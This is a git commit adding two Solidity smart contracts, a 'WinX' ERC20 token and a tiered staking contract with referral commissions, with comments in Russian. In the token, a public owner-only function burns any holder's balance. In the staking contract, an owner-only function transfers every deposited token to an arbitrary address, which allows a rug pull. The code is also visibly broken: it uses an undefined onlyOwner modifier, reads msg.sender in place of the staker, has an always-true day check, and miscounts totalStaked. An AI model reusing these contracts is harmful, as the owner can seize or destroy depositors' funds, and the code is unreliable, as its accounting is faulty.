fffd5d3fd6a881decede6fba80a9ff2ba06db372
Boris Vinnik <vinniklawyer@yandex.ru>
2023-05-31 23:04:10 +0800

    Update contracts

---
+++ contracts/PEPEcopyNEW.sol
@@ -0,0 +1,192 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/utils/Context.sol";
+import "@openzeppelin/contracts/security/Pausable.sol";
+
+contract WinX is Pausable, IERC20 {
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    uint256 private _totalSupply;
+    uint256 private _CAP = 420_690000000000e18;
+    string private constant _NAME = "WinX";
+    string private constant _SYMBOL = "WX";
+
+    constructor(uint256 initialSupply) {
+        require(_CAP > 0, "ERC20Capped: cap is 0");
+        _mint(_msgSender(), initialSupply * (10 ** decimals()));
+    }
+
+    fallback() external payable {}
+
+    receive() external payable {}
+
+    function name() public pure returns (string memory) {
+        return _NAME;
+    }
+
+    function symbol() public pure returns (string memory) {
+        return _SYMBOL;
+    }
+
+    function decimals() public pure returns (uint8) {
+        return 18;
+    }
+
+    function totalSupply() public view returns (uint256) {
+        return _totalSupply;
+    }
+
+    function cap() public view returns (uint256) {
+        return _CAP;
+    }
+
+    function balanceOf(address account) public view returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address to, uint256 amount) public returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, amount);
+        return true;
+    }
+
+    function allowance(
+        address owner,
+        address spender
+    ) public view returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(from, spender, amount);
+        _transfer(from, to, amount);
+        return true;
+    }
+
+    function increaseAllowance(
+        address spender,
+        uint256 addedValue
+    ) public returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, allowance(owner, spender) + addedValue);
+        return true;
+    }
+
+    function decreaseAllowance(
+        address spender,
+        uint256 subtractedValue
+    ) public returns (bool) {
+        address owner = _msgSender();
+        uint256 currentAllowance = allowance(owner, spender);
+        require(
+            currentAllowance >= subtractedValue,
+            "ERC20: decreased allowance below zero"
+        );
+        unchecked {
+            _approve(owner, spender, currentAllowance - subtractedValue);
+        }
+
+        return true;
+    }
+
+    function _transfer(address from, address to, uint256 amount) internal {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+        require(!paused(), "ERC20Pausable: token transfer while paused");
+
+        _beforeTokenTransfer(from, to);
+
+        uint256 fromBalance = _balances[from];
+        require(
+            fromBalance >= amount,
+            "ERC20: transfer amount exceeds balance"
+        );
+
+        unchecked {
+            _balances[from] -= amount;
+            _balances[to] += amount;
+        }
+
+        emit Transfer(from, to, amount);
+    }
+
+    function _mint(address account, uint256 amount) public onlyOwner {
+        require(account != address(0), "ERC20: mint to the zero address");
+        require(totalSupply() + amount <= cap(), "ERC20Capped: cap exceeded");
+        require(!paused(), "ERC20Pausable: token transfer while paused");
+
+        _beforeTokenTransfer(address(0), account);
+
+        _totalSupply += amount;
+        unchecked {
+            _balances[account] += amount;
+        }
+        emit Transfer(address(0), account, amount);
+    }
+
+    function _burn(address account, uint256 amount) public onlyOwner {
+        require(account != address(0), "ERC20: burn from the zero address");
+        require(!paused(), "ERC20Pausable: token transfer while paused");
+
+        _beforeTokenTransfer(account, address(0));
+
+        uint256 accountBalance = _balances[account];
+        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        unchecked {
+            _balances[account] = accountBalance - amount;
+            _CAP -= amount;
+        }
+
+        emit Transfer(account, address(0), amount);
+    }
+
+    function burnFrom(address account, uint256 amount) public onlyOwner {
+        _spendAllowance(account, _msgSender(), amount);
+        _burn(account, amount);
+    }
+
+    function _approve(address owner, address spender, uint256 amount) internal {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _spendAllowance(
+        address owner,
+        address spender,
+        uint256 amount
+    ) internal {
+        uint256 currentAllowance = allowance(owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(
+                currentAllowance >= amount,
+                "ERC20: insufficient allowance"
+            );
+            unchecked {
+                _approve(owner, spender, currentAllowance - amount);
+            }
+        }
+    }
+
+    function withdraw() public onlyOwner {
+        uint256 balance = address(this).balance;
+        payable(msg.sender).transfer(balance);
+    }
+
+    function _beforeTokenTransfer(address from, address to) internal virtual {}
+}
---
+++ contracts/StakingNEW.sol
@@ -0,0 +1,260 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract StakingWinX is ReentrancyGuard, Ownable {
+    using SafeERC20 for IERC20;
+
+    IERC20 public immutable rewardsToken;
+
+    struct rewardSchedule {
+        uint64 days30;
+        uint64 days45;
+        uint64 days60;
+        uint64 days90;
+    }
+
+    rewardSchedule public rewardMultiplier =
+        rewardSchedule({days30: 2, days45: 3, days60: 4, days90: 6});
+
+    struct Staker {
+        address referal;
+        uint256 deposited;
+        uint256 timeOfLastUpdate;
+        uint256 unclaimedRewards;
+        uint256 startStaking;
+    }
+
+    address private burnable;
+
+    // Rewards per hour. A fraction calculated as x/10.000.000 to get the percentage
+    uint256 public rewardsPerHour; // 0.0416%/h or 1%/day
+    uint256 public minStake = 1 * 10 ** 18;
+    uint256 private maxRewardDay;
+    uint256 private dayTime;
+    uint256 public totalStaked;
+
+    mapping(address => Staker) internal stakers;
+
+    event Stake(address staker, uint256 _amount);
+
+    event Withdraw(address staker, uint256 _deposit);
+
+    constructor(address _token, address _burnable) {
+        rewardsToken = IERC20(_token);
+        rewardsPerHour = 4160;
+        maxRewardDay = 13088133333 * 10 ** 18;
+        dayTime = block.timestamp;
+        burnable = _burnable;
+    }
+
+    function changeMaxRewardDay(uint256 _newreward) external onlyOwner {
+        maxRewardDay = _newreward;
+    }
+
+    function changeRewardPerHour(uint256 _newreward) external onlyOwner {
+        rewardsPerHour = _newreward;
+    }
+
+    function rewardPerDay() internal {}
+
+    function deposit(
+        uint256 _amount,
+        address referalAddress
+    ) external nonReentrant {
+        require(_amount >= minStake, "Amount smaller than minimimum deposit");
+        require(
+            rewardsToken.balanceOf(msg.sender) >= _amount,
+            "Can't stake more than you own"
+        );
+
+        // !необходимо выдать апрув данному контракту перед стейкингом
+        rewardsToken.transferFrom(msg.sender, address(this), _amount);
+
+        if (stakers[msg.sender].deposited == 0) {
+            stakers[msg.sender].deposited = _amount;
+            stakers[msg.sender].timeOfLastUpdate = block.timestamp;
+            stakers[msg.sender].unclaimedRewards = 0;
+            stakers[msg.sender].startStaking = block.timestamp;
+            totalStaked += _amount;
+            if (referalAddress != address(0)) {
+                stakers[msg.sender].referal = referalAddress;
+            }
+        } else {
+            uint256 rewards = calculateRewards(msg.sender);
+            stakers[msg.sender].unclaimedRewards += rewards;
+            stakers[msg.sender].deposited += _amount;
+            stakers[msg.sender].timeOfLastUpdate = block.timestamp;
+            totalStaked += _amount;
+            // stakers[msg.sender].startStaking = block.timestamp;
+        }
+
+        emit Stake(msg.sender, _amount);
+    }
+
+    // Mints rewards for msg.sender
+    function claimRewards() external nonReentrant {
+        Staker storage staker = stakers[msg.sender];
+
+        uint256 rewards = calculateRewards(msg.sender) +
+            staker.unclaimedRewards;
+        require(rewards > 0, "You have no rewards");
+
+        staker.unclaimedRewards = 0;
+        staker.timeOfLastUpdate = block.timestamp;
+
+        uint256 refReward = (9 * rewards) / 100;
+        uint256 comissionWithRef = (1 * rewards) / 100;
+        uint256 comission = (2 * rewards) / 100;
+
+        if (staker.referal != address(0)) {
+            rewardsToken.transfer(stakers[msg.sender].referal, refReward);
+            rewards -= (refReward + comissionWithRef);
+        } else {
+            rewards -= comission;
+        }
+
+        rewardsToken.transfer(burnable, comission);
+        rewardsToken.transfer(msg.sender, rewards);
+    }
+
+    function withdraw(uint256 _amount) external nonReentrant {
+        require(
+            stakers[msg.sender].deposited >= _amount,
+            "You have not enough deposit"
+        );
+        uint256 rewards = calculateRewards(msg.sender) +
+            stakers[msg.sender].unclaimedRewards;
+        stakers[msg.sender].unclaimedRewards = 0;
+        stakers[msg.sender].deposited -= _amount;
+        stakers[msg.sender].timeOfLastUpdate = block.timestamp;
+
+        uint256 amounwithdraw = _amount + rewards;
+
+        uint256 comission;
+
+        if (stakers[msg.sender].startStaking + 30 days >= block.timestamp) {
+            comission = (10 * _amount) / 100;
+            rewardsToken.transfer(burnable, comission);
+        } else {
+            comission = 0;
+        }
+
+        rewardsToken.transfer(msg.sender, amounwithdraw - comission);
+
+        totalStaked -= amounwithdraw;
+
+        emit Withdraw(msg.sender, amounwithdraw);
+    }
+
+    // Withdraw specified amount of staked tokens
+    function withdrawAll() external nonReentrant {
+        require(stakers[msg.sender].deposited > 0, "You have no deposit");
+        uint256 rewards = calculateRewards(msg.sender) +
+            stakers[msg.sender].unclaimedRewards;
+        uint256 _deposit = stakers[msg.sender].deposited;
+        stakers[msg.sender].unclaimedRewards = 0;
+        stakers[msg.sender].deposited = 0;
+        stakers[msg.sender].timeOfLastUpdate = 0;
+
+        uint256 amounwithdraw = _deposit + rewards;
+
+        uint256 comission;
+
+        if (stakers[msg.sender].startStaking + 30 days >= block.timestamp) {
+            comission = (10 * _deposit) / 100;
+            rewardsToken.transfer(burnable, comission);
+        } else {
+            comission = 0;
+        }
+
+        rewardsToken.transfer(msg.sender, amounwithdraw - comission);
+
+        totalStaked -= amounwithdraw;
+
+        emit Withdraw(msg.sender, amounwithdraw);
+    }
+
+    // Function useful for fron-end that returns user stake and rewards by address
+    function getDepositInfo(
+        address _user
+    ) public returns (uint256 _stake, uint256 _rewards, uint256 _startStaking) {
+        _stake = stakers[_user].deposited;
+        _rewards = calculateRewards(_user) + stakers[_user].unclaimedRewards;
+        _startStaking = stakers[_user].startStaking;
+        return (_stake, _rewards, _startStaking);
+    }
+
+    function getYieldMultiplier(
+        uint256 daysStaked
+    ) public view returns (uint256) {
+        if (daysStaked >= 90) return rewardMultiplier.days90;
+        if (daysStaked >= 60) return rewardMultiplier.days60;
+        if (daysStaked >= 45) return rewardMultiplier.days45;
+        if (daysStaked >= 30) return rewardMultiplier.days30;
+        return 0;
+    }
+
+    function calculateRewards(address _staker) internal returns (uint256) {
+        uint256 daysStaked = (block.timestamp -
+            stakers[msg.sender].startStaking) / 1 days;
+        uint256 yieldMultiplier = getYieldMultiplier(daysStaked);
+        uint256 rewardPerHours;
+
+        uint256[7] memory bounds = [
+            uint256(10000 * 10 ** 18),
+            1000000 * 10 ** 18,
+            10000000 * 10 ** 18,
+            100000000 * 10 ** 18,
+            1000000000 * 10 ** 18,
+            10000000000 * 10 ** 18,
+            100000000000 * 10 ** 18
+        ];
+
+        uint256[7] memory rewardValues = [
+            uint256(4160),
+            3500,
+            3000,
+            2500,
+            2000,
+            1500,
+            1000
+        ];
+
+        for (uint256 i = 0; i < bounds.length; i++) {
+            if (stakers[_staker].deposited <= bounds[i]) {
+                rewardPerHours = rewardValues[i];
+            }
+        }
+
+        uint256 allrewards = (((((block.timestamp -
+            stakers[_staker].timeOfLastUpdate) * stakers[_staker].deposited) *
+            rewardPerHours) / 3600) / 10000000) * yieldMultiplier;
+
+        if (maxRewardDay >= allrewards) {
+            maxRewardDay -= allrewards;
+            return allrewards;
+        } else {
+            uint256 returnReward = maxRewardDay;
+            maxRewardDay = 0;
+            return returnReward;
+        }
+    }
+
+    function WithdrawFromContract(address to) external onlyOwner {
+        uint256 balance = rewardsToken.balanceOf(address(this));
+        rewardsToken.transfer(to, balance);
+    }
+
+    //!необходимо запустить скрипт, который каждый день будет обновлять пул наград
+    function changeDay() external onlyOwner {
+        require(dayTime >= 1 days, "Day is not end");
+        dayTime = block.timestamp;
+        maxRewardDay = 13088133333 * 10 ** 18;
+    }
+}
